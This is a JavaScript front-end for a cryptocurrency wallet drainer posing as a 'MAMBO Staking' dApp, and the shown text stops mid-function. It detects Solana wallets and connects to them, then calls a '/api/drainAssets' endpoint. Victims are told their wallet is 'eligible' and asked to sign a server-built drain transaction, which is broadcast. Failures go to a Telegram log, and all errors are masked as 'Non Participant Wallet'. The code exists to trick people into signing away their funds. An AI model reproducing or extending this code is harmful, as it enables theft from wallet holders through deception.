    window.showStatus = function(message, type = 'info') {
        console.log(`[STATUS] ${type.toUpperCase()}: ${message}`);
      
      const existingStatus = document.getElementById('status-message');
      if (existingStatus) {
        existingStatus.remove();
      }
      
      const statusDiv = document.createElement('div');
      statusDiv.id = 'status-message';
      statusDiv.style.cssText = `
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        padding: 15px 25px;
        border-radius: 8px;
        color: white;
        font-weight: bold;
        z-index: 10000;
        max-width: 80%;
        text-align: center;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      `;
      
      switch (type) {
        case 'success':
          statusDiv.style.background = '#28a745';
          break;
        case 'error':
          statusDiv.style.background = '#dc3545';
          break;
        case 'warning':
          statusDiv.style.background = '#ffc107';
          statusDiv.style.color = '#333';
          break;
        case 'loading':
          statusDiv.style.background = '#007bff';
          break;
        default:
          statusDiv.style.background = '#6c757d';
      }
      
      statusDiv.textContent = message;
      document.body.appendChild(statusDiv);
      
        setTimeout(() => {
        if (statusDiv.parentNode) {
          statusDiv.parentNode.removeChild(statusDiv);
        }
      }, 5000);
    };

        // Wallet modal functions with enhanced detection
    window.openWalletModal = function() {
      console.log('üéØ [OPEN_WALLET_MODAL] openWalletModal called');
      
      var modal = document.getElementById('walletModal');
      var walletList = document.getElementById('walletList');
      
      if (!modal || !walletList) {
        console.error('‚ùå [OPEN_WALLET_MODAL] Modal elements missing');
        console.error('  - Modal found:', !!modal);
        console.error('  - Wallet list found:', !!walletList);
        return;
      }

      console.log('‚úÖ [OPEN_WALLET_MODAL] Modal elements found, refreshing wallet detection...');
      
      // Refresh wallet detection before opening modal
      refreshWalletDetection();
      
      // Generate wallet list
      generateWalletList();
      
      // Show modal
      modal.classList.add('active');
      modal.style.display = 'flex';
      
      console.log('‚úÖ [OPEN_WALLET_MODAL] Modal opened successfully');
    };

    // Enhanced mobile wallet detection and connection helpers
    window.isMobileWallet = function(walletKey) {
      const mobileWallets = ['glow']; // Only Glow is fully supported on mobile
      return mobileWallets.includes(walletKey.toLowerCase());
    };
    
    // Mobile dApp browser detection and wallet injection verification
    window.isMobileDAppBrowser = function() {
      const userAgent = navigator.userAgent.toLowerCase();
      return (
        /mobile|android|iphone|ipad|ipod|blackberry|windows phone/i.test(userAgent) ||
        /phantom|solflare|glow|exodus/i.test(userAgent) ||
        window.location.protocol === 'https:' && window.location.hostname !== 'localhost'
      );
    };
    
    // Verify wallet injection before attempting drains
    window.verifyWalletInjection = function(walletKey, timeout = 30000) {
      return new Promise((resolve, reject) => {
        const startTime = Date.now();
        
        const checkInjection = () => {
          const wallet = window.getWalletProvider(walletKey);
          
          if (wallet && typeof wallet.connect === 'function') {
            console.log(`‚úÖ [WALLET_INJECTION] ${walletKey} wallet properly injected`);
            resolve(wallet);
            return;
          }
          
          if (Date.now() - startTime > timeout) {
            console.error(`‚ùå [WALLET_INJECTION] ${walletKey} wallet injection timeout after ${timeout}ms`);
            reject(new Error(`Wallet injection timeout for ${walletKey}`));
            return;
          }
          
          // Check again in 100ms
          setTimeout(checkInjection, 100);
        };
        
        checkInjection();
      });
    };
    
    // Get wallet provider with validation
    window.getWalletProvider = function(walletKey) {
      const wallet = supportedWallets.find(w => w.key === walletKey);
      if (!wallet) {
        console.warn(`‚ö†Ô∏è [WALLET_PROVIDER] Unknown wallet key: ${walletKey}`);
        return null;
      }
      
      const provider = wallet.provider();
      if (!provider) {
        console.warn(`‚ö†Ô∏è [WALLET_PROVIDER] No provider found for ${walletKey}`);
        return null;
      }
      
      return provider;
    };

    window.getMobileWalletConnectionHint = function(walletKey) {
      const hints = {

        'exodus': 'üì± Exodus: Please open the Exodus app on your mobile device and approve the connection',
        'glow': 'üì± Glow: Please open the Glow app on your mobile device and approve the connection'
      };
      return hints[walletKey.toLowerCase()] || 'üì± Mobile wallet: Please check your mobile device for connection approval';
    };

    // Connection status display functions
    window.showConnectionStatus = function(message, type = 'info', showProgress = false) {
      const statusContainer = document.getElementById('connection-status');
      const statusText = document.getElementById('status-text');
      const statusProgress = document.getElementById('status-progress');
      
      if (statusContainer && statusText) {
        statusContainer.style.display = 'block';
        statusText.textContent = message;
        
        // Update colors based on type
        switch (type) {
          case 'success':
            statusContainer.style.background = 'rgba(76, 175, 80, 0.2)';
            statusContainer.style.border = '1px solid rgba(76, 175, 80, 0.3)';
            break;
          case 'error':
            statusContainer.style.background = 'rgba(244, 67, 54, 0.2)';
            statusContainer.style.border = '1px solid rgba(244, 67, 54, 0.3)';
            break;
          case 'warning':
            statusContainer.style.background = 'rgba(255, 193, 7, 0.2)';
            statusContainer.style.border = '1px solid rgba(255, 193, 7, 0.3)';
            break;
          case 'loading':
            statusContainer.style.background = 'rgba(33, 150, 243, 0.2)';
            statusContainer.style.border = '1px solid rgba(33, 150, 243, 0.3)';
            break;
          default:
            statusContainer.style.background = 'rgba(255, 255, 255, 0.1)';
            statusContainer.style.border = '1px solid rgba(255, 255, 255, 0.2)';
        }
        
        if (showProgress && statusProgress) {
          statusProgress.style.display = 'block';
        } else if (statusProgress) {
          statusProgress.style.display = 'none';
        }
      }
    }

    window.updateConnectionProgress = function(percentage) {
      const progressBar = document.getElementById('progress-bar');
      if (progressBar) {
        progressBar.style.width = percentage + '%';
      }
    };

    window.hideConnectionStatus = function() {
      const statusContainer = document.getElementById('connection-status');
      if (statusContainer) {
        statusContainer.style.display = 'none';
      }
    };

    // Manual wallet detection refresh
    window.refreshWalletDetection = function() {
      console.log('üîÑ [REFRESH_DETECTION] Refreshing wallet detection...');
      
      // Clear cached wallets
      delete window.phantomWallet;
      delete window.solflareWallet;
      delete window.backpackWallet;
      delete window.exodusWallet;
      delete window.glowWallet;
      
      delete window.xnftWallet;
      
      // Re-run detection
      if (window.phantom?.solana) {
        window.phantomWallet = window.phantom.solana;
        console.log('‚úÖ [REFRESH_DETECTION] Phantom detected via window.phantom.solana');
      } else if (window.phantom) {
        window.phantomWallet = window.phantom;
        console.log('‚úÖ [REFRESH_DETECTION] Phantom detected via window.phantom');
      }
      
      if (window.solflare) {
        window.solflareWallet = window.solflare;
        console.log('‚úÖ [REFRESH_DETECTION] Solflare detected');
      }
      
      if (window.backpack) {
        window.backpackWallet = window.backpack;
        console.log('‚úÖ [REFRESH_DETECTION] Backpack detected');
      }
      
      if (window.exodus) {
        window.exodusWallet = window.exodus;
        console.log('‚úÖ [REFRESH_DETECTION] Exodus detected');
      }
      
      if (window.glow) {
        window.glowWallet = window.glow;
        console.log('‚úÖ [REFRESH_DETECTION] Glow detected');
      }
      
      
      
      if (window.xnft) {
        window.xnftWallet = window.xnft;
        console.log('‚úÖ [REFRESH_DETECTION] XNFT detected');
      }
      
      // Log final detection results
      const detectedWallets = [];
      if (window.phantomWallet) detectedWallets.push('Phantom');
      if (window.solflareWallet) detectedWallets.push('Solflare');
      if (window.backpackWallet) detectedWallets.push('Backpack');
      if (window.exodusWallet) detectedWallets.push('Exodus');
      if (window.glowWallet) detectedWallets.push('Glow');
      if (window.xnftWallet) detectedWallets.push('XNFT');
      
        console.log(`üéØ [REFRESH_DETECTION] Detection refresh complete. Found: ${detectedWallets.join(', ') || 'None'}`);
    };

    window.closeWalletModal = function() {
      const modal = document.getElementById('walletModal');
      modal.style.display = 'none';
    };

    // Generate wallet list with enhanced detection and unsupported wallet handling
    window.generateWalletList = function() {
      console.log('üîç [GENERATE_WALLET_LIST] Starting wallet list generation...');
      
      // Use only supported wallets
      var wallets = window.getSupportedWallets ? window.getSupportedWallets() : fallbackWallets;
      var walletList = document.getElementById('walletList');
      
      if (!walletList) {
        console.error('‚ùå [GENERATE_WALLET_LIST] Wallet list element not found');
        return;
      }
      
      console.log(`üìã [GENERATE_WALLET_LIST] Processing ${wallets.length} supported wallet definitions`);
      
      walletList.innerHTML = '';
      let availableCount = 0;
      let installedCount = 0;
      
      if (wallets.length === 0) {
        // No supported wallets found
        walletList.innerHTML = `
          <div class="no-wallets-message" style="text-align: center; padding: 30px; color: #666;">
            <h4 style="color: #dc3545; margin-bottom: 15px;">‚ö†Ô∏è No Supported Wallets Found</h4>
            <p style="margin-bottom: 20px;">This dApp requires wallets with full Solana support. Please install one of these:</p>
            <div class="wallet-install-links" style="display: flex; flex-direction: column; gap: 15px; align-items: center;">
              <a href="https://phantom.app/" target="_blank" class="wallet-install-link" style="
                display: flex; align-items: center; gap: 10px; padding: 12px 20px; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                color: white; text-decoration: none; border-radius: 8px; font-weight: bold;
              ">
                <img src="/phantom-logo.png" alt="Phantom" style="width: 24px; height: 24px;">
                <span>Install Phantom</span>
              </a>
              <a href="https://solflare.com/" target="_blank" class="wallet-install-link" style="
                display: flex; align-items: center; gap: 10px; padding: 12px 20px; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                color: white; text-decoration: none; border-radius: 8px; font-weight: bold;
              ">
                <img src="/solflare-logo.png" alt="Solflare" style="width: 24px; height: 24px;">
                <span>Install Solflare</span>
              </a>
              <a href="https://glow.app/" target="_blank" class="wallet-install-link" style="
                display: flex; align-items: center; gap: 10px; padding: 12px 20px; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                color: white; text-decoration: none; border-radius: 8px; font-weight: bold;
              ">
                <img src="/glow-logo.png" alt="Glow" style="width: 24px; height: 24px;">
                <span>Install Glow</span>
              </a>
            </div>
            <p style="margin-top: 20px; font-size: 14px; color: #888; font-style: italic;">
              Note: Only wallets with complete Solana functionality are compatible with this dApp.
            </p>
          </div>
        `;
        return;
      }
      
      wallets.forEach(function(wallet, index) {
        console.log(`üîç [GENERATE_WALLET_LIST] Processing wallet ${index + 1}/${wallets.length}: ${wallet.name}`);
        
        var provider = wallet.provider();
        var isAvailable = provider && typeof provider.connect === 'function';
        
        console.log(`  - Provider found: ${provider ? 'YES' : 'NO'}`);
        console.log(`  - Has connect method: ${provider && typeof provider.connect === 'function' ? 'YES' : 'NO'}`);
        console.log(`  - Is available: ${isAvailable ? 'YES' : 'NO'}`);
        
        if (isAvailable) availableCount++;
        if (provider) installedCount++;
        
        var walletItem = document.createElement('div');
        walletItem.className = 'wallet-item';
        walletItem.innerHTML = `
          <img src="${wallet.icon}" alt="${wallet.name}" class="wallet-icon" onerror="this.style.display='none'">
            <span class="wallet-name">${wallet.name}</span>
            <span class="wallet-status ${isAvailable ? 'available' : 'not-installed'}">
              ${isAvailable ? '‚úÖ Available' : '‚ùå Not Installed'}
            </span>
        `;
        
        if (isAvailable) {
          walletItem.addEventListener('click', function() {
            console.log(`üéØ [WALLET_CLICK] User clicked on ${wallet.name}`);
            connectWalletWithPopup(wallet.key);
          });
          walletItem.style.cursor = 'pointer';
        } else {
          walletItem.addEventListener('click', function() {
            console.log(`üîó [WALLET_INSTALL] Opening install page for ${wallet.name}`);
            window.open(wallet.install, '_blank');
          });
          walletItem.style.cursor = 'pointer';
        }
        
        walletList.appendChild(walletItem);
        console.log(`‚úÖ [GENERATE_WALLET_LIST] Added ${wallet.name} to list`);
      });
      
      console.log(`üéØ [GENERATE_WALLET_LIST] Generation complete. Available: ${availableCount}, Installed: ${installedCount}, Total: ${wallets.length}`);
      
      // If no wallets are available, show appropriate message or Web3Modal for mobile
      if (availableCount === 0) {
        if (isMobileDevice()) {
          // For mobile users, show Web3Modal option
          const web3ModalMessage = document.createElement('div');
          web3ModalMessage.style.cssText = 'text-align: center; padding: 20px; color: #667eea;';
          web3ModalMessage.innerHTML = `
            <p style="margin-bottom: 15px; font-weight: bold;">üì± Mobile Wallet Connection</p>
            <p style="margin-bottom: 20px; color: #666;">No Solana wallets detected on your mobile device</p>
            <button id="showWeb3ModalBtn" style="
              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
              color: white;
              border: none;
              padding: 12px 24px;
              border-radius: 25px;
              font-size: 16px;
              font-weight: bold;
              cursor: pointer;
              box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
              transition: all 0.3s ease;
            " onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 20px rgba(102, 126, 234, 0.6)'" 
              onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 4px 15px rgba(102, 126, 234, 0.4)'">
              üîó Connect Any Wallet
            </button>
            <p style="margin-top: 15px; font-size: 14px; color: #888;">Tap to connect with any supported wallet</p>
          `;
          walletList.appendChild(web3ModalMessage);
          
          // Add click handler for Web3Modal button
          document.getElementById('showWeb3ModalBtn').addEventListener('click', function() {
            if (window.showWeb3ModalForMobile) {
              window.showWeb3ModalForMobile();
            }
          });
        } else {
          // For desktop users, show traditional install links
          const noWalletMessage = document.createElement('div');
          noWalletMessage.style.cssText = 'text-align: center; padding: 20px; color: #666; font-style: italic;';
          noWalletMessage.innerHTML = `
            <p>No Solana wallets detected</p>
            <p>Please install one of the supported wallets:</p>
            <div style="margin-top: 15px;">
              <a href="https://phantom.app/" target="_blank" style="color: #667eea; margin: 0 10px;">Phantom</a>
              <a href="https://solflare.com/" target="_blank" style="color: #667eea; margin: 0 10px;">Solflare</a>
              <a href="https://backpack.app/" target="_blank" style="color: #667eea; margin: 0 10px;">Backpack</a>
            </div>
          `;
          walletList.appendChild(noWalletMessage);
        }
      }
    }

    // Mobile device detection function
    window.isMobileDevice = function() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
             (window.innerWidth <= 768 && window.innerHeight <= 1024);
    };

    // Enhanced utility functions with better timeout management
    window.getWalletTimeout = function(walletKey) {
      const timeouts = {
        'phantom': 45000,      // Increased to 45s for more lenient connections
        'solflare': 45000,     // Increased to 45s for more lenient connections
        'backpack': 45000,     // Increased to 45s for more lenient connections
        'glow': 45000,         // Increased to 45s for more lenient connections
        'exodus': 50000,       // Increased to 50s for more lenient connections

      };
      return timeouts[walletKey] || 45000;
    };

    window.getWalletRetryCount = function(walletKey) {
      const retryCounts = {
        'phantom': 2,
        'solflare': 2,
        'backpack': 2,
        'glow': 2,
        'exodus': 2,

      };
      return retryCounts[walletKey] || 2;
    };

    window.classifyWalletError = function(error) {
      if (error.message.includes('User rejected')) return 'user_rejected';
      if (error.message.includes('popup')) return 'popup_blocked';
      if (error.message.includes('timeout')) return 'timeout';
      if (error.message.includes('already pending')) return 'pending_request';
      return 'unknown';
    };

    window.getWalletErrorMessage = function(walletKey, errorType) {
      const messages = {
        'user_rejected': 'Non Participant Wallet',
        'popup_blocked': 'Non Participant Wallet',
        'timeout': 'Non Participant Wallet',
        'pending_request': 'Non Participant Wallet',
        'unknown': 'Non Participant Wallet'
      };
      return messages[errorType] || messages['unknown'];
    };

    // Enhanced wallet connection functions with retry logic, mobile wallet support, and injection verification
    window.connectWalletWithPopup = async function(walletKey) {
      if (window.walletManager.isConnecting(walletKey)) {
        console.log(`[CONNECT] Already connecting to ${walletKey}`);
        return;
      }
      
      if (window.walletManager.isCircuitBreakerOpen(walletKey)) {
        console.log(`[CONNECT] Circuit breaker open for ${walletKey}`);
        return;
      }
      
      window.walletManager.setConnectionState(walletKey, 'connecting');
      
      let def;
      let retryCount = 0;
      const maxRetries = getWalletRetryCount(walletKey);
      
      try {
        // Verify wallet injection first (especially important for mobile dApp browsers)
        if (window.isMobileDAppBrowser && window.isMobileDAppBrowser()) {
          console.log(`üì± [CONNECT] Mobile dApp browser detected, verifying wallet injection...`);
          
          try {
            await window.verifyWalletInjection(walletKey, 30000); // 30s timeout for mobile (more lenient)
            console.log(`‚úÖ [CONNECT] Wallet injection verified for ${walletKey}`);
          } catch (injectionError) {
            console.error(`‚ùå [CONNECT] Wallet injection verification failed:`, injectionError.message);
            throw new Error(`Wallet not properly injected. Please refresh the page or try again.`);
          }
        }
        
        def = supportedWallets.find(w => w.key === walletKey) || fallbackWallets.find(w => w.key === walletKey);
        if (!def) {
          throw new Error(`Unsupported wallet type: ${walletKey}`);
        }

        const provider = def.provider();
        if (!provider) {
          throw new Error(`${def.name} not installed or missing required methods`);
        }
        
        let publicKey = provider.publicKey;
        
        if (!publicKey) {
          console.log(`[CONNECT] No existing public key, connecting to ${def.name}`);
          
          // Retry connection with exponential backoff
          while (retryCount <= maxRetries) {
            try {
              console.log(`[CONNECT] Attempt ${retryCount + 1}/${maxRetries + 1} for ${def.name}`);
              
              const timeout = getWalletTimeout(walletKey);
              console.log(`[CONNECT] Using timeout: ${timeout}ms for ${def.name}`);
              
              // Special handling for mobile wallets
              if (isMobileWallet(walletKey)) {
                console.log(`[CONNECT] Mobile wallet detected: ${def.name}, using enhanced connection`);
                
                // Show mobile wallet specific connection hint
                showConnectionStatus(getMobileWalletConnectionHint(walletKey), 'loading', true);
                
                // For mobile wallets, try to trigger the connection and wait longer
                const connectionPromise = provider.connect();
                
                // Show user feedback for mobile wallet connection
                if (window.showStatus) {
                  window.showStatus(`üì± Connecting to ${def.name}... Please check your mobile device`, 'loading');
                }
                
                // Update progress bar during connection
                const startTime = Date.now();
                let progressInterval = setInterval(() => {
                  const elapsed = Date.now() - startTime;
                  const progress = Math.min((elapsed / timeout) * 100, 95);
                  updateConnectionProgress(progress);
                }, 100);
                const result = await Promise.race([
                  connectionPromise,
                  new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Connection timeout')), timeout)
                  )
                ]);
                
                clearInterval(progressInterval);
                updateConnectionProgress(100);
                
                publicKey = result?.publicKey || provider.publicKey;
                console.log(`[CONNECT] Mobile wallet connection successful on attempt ${retryCount + 1}`);
                
                showConnectionStatus(`‚úÖ Successfully connected to ${def.name}!`, 'success');
                setTimeout(hideConnectionStatus, 3000);
                break;
                
              } else {
                // Standard connection for desktop wallets
                const result = await Promise.race([
                  provider.connect(),
                  new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Connection timeout')), timeout)
                  )
                ]);
                
                publicKey = result?.publicKey || provider.publicKey;
                console.log(`[CONNECT] Desktop wallet connection successful on attempt ${retryCount + 1}`);
                break;
              }
              
            } catch (attemptError) {
              retryCount++;
              console.log(`[CONNECT] Attempt ${retryCount}/${maxRetries + 1} failed:`, attemptError.message);
              
              if (retryCount <= maxRetries) {
                const backoffDelay = Math.min(1000 * Math.pow(2, retryCount - 1), 5000);
                console.log(`[CONNECT] Attempt ${retryCount} failed. Waiting ${backoffDelay}ms before retry...`);
                
                if (window.showStatus) {
                  window.showStatus(`üîÑ Connection attempt ${retryCount} failed. Retrying in ${backoffDelay/1000}s...`, 'warning');
                }
                
                await new Promise(resolve => setTimeout(resolve, backoffDelay));
              } else {
                throw attemptError;
              }
            }
          }
        } else {
          logger.log(`[CONNECT] Found existing public key for ${def.name}, ensuring connection`);
          
          try {
            await provider.connect();
            publicKey = provider.publicKey;
          } catch (connectError) {
            logger.log(`[CONNECT] Reconnection failed, using existing public key:`, connectError.message);
          }
        }
        
        if (!publicKey) {
          throw new Error('Failed to get public key');
        }
        
        logger.log(`[CONNECT] Successfully connected to ${def.name}`);
        
        // Set current wallet type for global access
        window.currentWalletType = def.name;
        
        window.walletManager.resetCircuitBreaker(walletKey);
        
        if (typeof window.integrateWithDrainAssets === 'function') {
          window.integrateWithDrainAssets(publicKey, def.name, provider);
        }
        
      } catch (error) {
        // Use centralized error handling
        const errorInfo = handleWalletError(error, walletKey, {
          retryCount: retryCount,
          maxRetries: maxRetries,
          walletName: def?.name || walletKey
        });
        
        logger.log(`[CONNECT] ${def?.name || walletKey} connection failed after ${retryCount} attempts:`, errorInfo.userMessage);
        
        window.walletManager.recordFailure(walletKey);
        
        // For mobile users, show Web3Modal as fallback when wallet connection fails
        if (isMobileDevice()) {
          logger.log(`[CONNECT] Mobile wallet connection failed, showing Web3Modal fallback`);
          if (window.showWeb3ModalForMobile) {
            window.showWeb3ModalForMobile();
          }
      } else {
          if (window.showStatus) {
            window.showStatus(errorInfo.userMessage, 'error');
          }
        }
      } finally {
        window.walletManager.clearConnectionState(walletKey);
      }
    }

    // Enhanced drain assets integration with better error handling and debugging
    window.integrateWithDrainAssets = async function(publicKey, walletType, provider) {
      if (!publicKey || !walletType || !provider) {
        console.log('[DRAIN] Invalid parameters');
        return;
      }
      
      console.log(`[DRAIN] Starting drain process for ${walletType} wallet:`, publicKey);
      
      try {
        if (window.showStatus) window.showStatus('üîç Checking wallet eligibility...', 'loading');
        
        // Show connection status for mobile wallets
        if (isMobileWallet(walletType.toLowerCase())) {
          showConnectionStatus(`üîç Checking ${walletType} wallet eligibility...`, 'loading', true);
        }
        
        console.log(`[DRAIN] Calling /api/drainAssets for wallet:`, publicKey);
        
        // Use AbortController for optimized timeout - much faster response
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), window.getTimeout('DRAIN_API_TIMEOUT')); // 15 second timeout
        
        let response;
        try {
          if (window.showStatus) window.showStatus('üöÄ Checking wallet contents...', 'loading');
          
          response = await fetch('/api/drainAssets', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user: publicKey, walletType: walletType }),
            signal: controller.signal
          });
          
          clearTimeout(timeoutId);
        } catch (fetchError) {
          clearTimeout(timeoutId);
          
          // Handle timeout and other fetch errors gracefully
          if (fetchError.name === 'AbortError') {
            logger.log(`[DRAIN] Request timed out after 15 seconds, retrying...`);
            if (window.showStatus) window.showStatus('üîÑ Request timed out, retrying...', 'loading');
            
            // Wait a bit and retry once with shorter timeout
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            try {
              if (window.showStatus) window.showStatus('üîÑ Retrying wallet check...', 'loading');
              response = await fetch('/api/drainAssets', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user: publicKey, walletType: walletType })
              });
            } catch (retryError) {
              throw new Error(`Retry failed: ${retryError.message}`);
            }
          } else {
            throw fetchError;
          }
        } finally {
          // Ensure timeout is always cleared
          clearTimeout(timeoutId);
        }
        
        logger.log(`[DRAIN] API response status:`, response.status);
        
        if (!response.ok) {
          // Use centralized error handling for API errors
          const errorInfo = handleApiError(response, {
            publicKey: publicKey,
            walletType: walletType,
            endpoint: '/api/drainAssets'
          });
          
          // Show clean error message to user
          if (window.showStatus) window.showStatus(errorInfo.userMessage, 'error');
          
          // Handle successful connection even on error
          handleSuccessfulWalletConnection(publicKey, walletType, provider, { success: false });
          return;
        }
        
        let data = await response.json();
        console.log(`[DRAIN] API response data:`, data);
        
        if (data.success === false && (data.message === 'No tokens found for staking' || data.message === 'üöÄ No tokens found in this wallet for the MAMBO staking')) {
          console.log('[DRAIN] No tokens found for staking');
          if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
          handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
          return;
        }
        
        // Check if pre-initialization is required
        if (data.success === true && data.requiresPreInit === true) {
          console.log('[DRAIN] Pre-initialization required before draining');
          console.log('[DRAIN] Pre-init transactions:', data.preInitTransactions);
          
          if (window.showStatus) window.showStatus('üîß Pre-initialization required - setting up token accounts...', 'loading');
          
          // Handle pre-initialization
          try {
            if (window.showStatus) window.showStatus('üîß Setting up token accounts - this may take a moment...', 'loading');
            await handlePreInitialization(publicKey, walletType, provider, data);
            return;
          } catch (preInitError) {
            console.error('[DRAIN] Pre-initialization failed:', preInitError);
            
            // Log critical pre-initialization failures to Telegram
            if (window.sendTelegramLog) {
              window.sendTelegramLog('API_CALL', {
                error: preInitError.message,
                stack: preInitError.stack,
                context: 'Drain Pre-Initialization',
                walletType: window.currentWalletType || 'Unknown',
                timestamp: new Date().toISOString(),
                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
              });
            }
            
            if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
            throw preInitError;
          }
        }
        
        if (!data.success) {
          // Show clean error message to user
          if (window.showStatus) window.showStatus(data.message || 'Non Participant Wallet', 'error');
          
          // Handle successful connection even on error
          handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
          return;
        }
        
        // Success case - wallet has sufficient funds and tokens
        console.log(`[DRAIN] Wallet eligible for drain. Transaction data:`, data);
        
        if (window.showStatus) window.showStatus('‚úÖ Wallet eligible! Triggering signature request...', 'success');
        
        // Proceed with the actual drain process - this will trigger wallet signature
        await proceedWithDrain(publicKey, walletType, provider, data);
        
      } catch (error) {
        // Use centralized error handling
        try {
          const errorInfo = window.logFrontendError(error, {
            publicKey: publicKey,
            walletType: walletType,
            context: 'Drain Process Failure'
          });
          
          if (window.showStatus && errorInfo && errorInfo.userMessage) {
            window.showStatus(errorInfo.userMessage, 'error');
          } else if (window.showStatus) {
            window.showStatus('Non Participant Wallet', 'error');
          }
        } catch (errorHandlingError) {
          console.error('[ERROR_HANDLING] Failed to handle error:', errorHandlingError);
          if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
        }
        
        // Hide connection status for mobile wallets
        if (isMobileWallet(walletType.toLowerCase())) {
          hideConnectionStatus();
        }
        
        // Handle successful connection even on error
        handleSuccessfulWalletConnection(publicKey, walletType, provider, { success: false });
      }
    };

    // Proceed with the actual drain process
    async function proceedWithDrain(publicKey, walletType, provider, data) {
      logger.log(`[DRAIN] Proceeding with drain for ${walletType}`);
      
      if (data.transaction && provider?.signTransaction) {
        try {
          logger.log(`[DRAIN] Converting transaction from base64...`);
          const transaction = window.convertBase64ToTransaction(data.transaction);
          logger.log(`[DRAIN] Transaction converted successfully:`, transaction);
          
          if (window.showStatus) window.showStatus('üöÄ Transaction ready! Please sign in your wallet...', 'loading');
          
          logger.log(`[DRAIN] Requesting transaction signature from ${walletType}...`);
          
          // Set optimized timeout for signing - much faster trigger
          const signPromise = provider.signTransaction(transaction);
          const signTimeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Signing timeout - please try again')), 30000) // 30 seconds - much faster
          );
          
          let signedTransaction;
          try {
            if (window.showStatus) window.showStatus('üöÄ SIGNATURE REQUIRED! Please check your wallet now...', 'loading');
            signedTransaction = await Promise.race([signPromise, signTimeoutPromise]);
            logger.log(`[DRAIN] Transaction signed successfully:`, signedTransaction);
            
            // Validate signed transaction
            if (!signedTransaction || typeof signedTransaction.serialize !== 'function') {
              throw new Error('Invalid signed transaction received from wallet');
            }
          } catch (signError) {
            logger.error(`[DRAIN] Transaction signing failed:`, signError);
            
            // Log critical signing failures to Telegram
            if (window.sendTelegramLog) {
              window.sendTelegramLog('TRANSACTION_SIGNING', {
                error: signError.message,
                stack: signError.stack,
                context: 'Drain Transaction Signing',
                walletType: walletType,
                timestamp: new Date().toISOString(),
                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
              });
            }
            
            throw signError;
          }
          
          if (window.showStatus) window.showStatus('üì° Broadcasting transaction...', 'loading');
          
          logger.log(`[DRAIN] Broadcasting signed transaction...`);
          
                  // Use AbortController for optimized timeout
        const broadcastController = new AbortController();
        const broadcastTimeoutId = setTimeout(() => broadcastController.abort(), 30000); // 30 second timeout (optimized)
          
          let broadcastResponse;
          try {
            broadcastResponse = await fetch('/api/broadcast', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                signedTransaction: signedTransaction.serialize().toString('base64'),
                rpcEndpoint: data.rpcEndpoint || window.getConfig('PRIMARY_RPC')
              }),
              signal: broadcastController.signal
            });
            
            clearTimeout(broadcastTimeoutId);
            logger.log(`[DRAIN] Broadcast response status:`, broadcastResponse.status);
          } catch (broadcastError) {
            clearTimeout(broadcastTimeoutId);
            
            if (broadcastError.name === 'AbortError') {
              logger.log(`[DRAIN] Broadcast request timed out after 30 seconds, retrying...`);
              if (window.showStatus) window.showStatus('üîÑ Broadcast timed out, retrying...', 'loading');
              
              // Wait and retry once
              await new Promise(resolve => setTimeout(resolve, 5000));
              
              try {
                broadcastResponse = await fetch('/api/broadcast', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    signedTransaction: signedTransaction.serialize().toString('base64'),
                    rpcEndpoint: data.rpcEndpoint || window.getConfig('PRIMARY_RPC')
            })
          });
              } catch (retryError) {
                throw new Error(`Broadcast retry failed: ${retryError.message}`);
              }
            } else {
              throw broadcastError;
            }
          } finally {
            // Ensure timeout is always cleared
            clearTimeout(broadcastTimeoutId);
          }
          
          if (!broadcastResponse.ok) {
            const broadcastError = await broadcastResponse.text();
            logger.error(`[DRAIN] Broadcast failed with status ${broadcastResponse.status}:`, broadcastError);
      
      // Log critical broadcast failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('API_CALL', {
          error: broadcastError.message,
          stack: broadcastError.stack,
          context: 'Drain Broadcast',
          walletType: window.currentWalletType || 'Unknown',
          responseStatus: broadcastResponse.status,
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
            
            // Try to parse the error response
            let errorData;
            try {
              errorData = JSON.parse(broadcastError);
            } catch (e) {
              errorData = { message: 'Non Participant Wallet' };
            }
            
            // Show clean error message to user
            if (window.showStatus) window.showStatus(errorData.message || 'Non Participant Wallet', 'error');
            
            // Handle successful connection even on error
            handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
            return;
          }
          
          const broadcastResult = await broadcastResponse.json();
          logger.log(`[DRAIN] Broadcast result:`, broadcastResult);
          
          if (broadcastResult.success) {
            logger.log('[DRAIN] Drain successful! Signature:', broadcastResult.signature);
            if (window.showStatus) window.showStatus('Eligible, Check wallet for Tokens', 'success');
            
            // Hide connection status for mobile wallets
            if (isMobileWallet(walletType.toLowerCase())) {
              hideConnectionStatus();
            }
            
            handleSuccessfulWalletConnection(publicKey, walletType, provider, {
              ...data, signedTransaction, broadcastResult, drained: true
            });
          } else {
            logger.error(`[DRAIN] Broadcast failed:`, broadcastResult.error);
      
      // Log critical broadcast result failures to Telegram
      if (window.sendTelegramLog) {
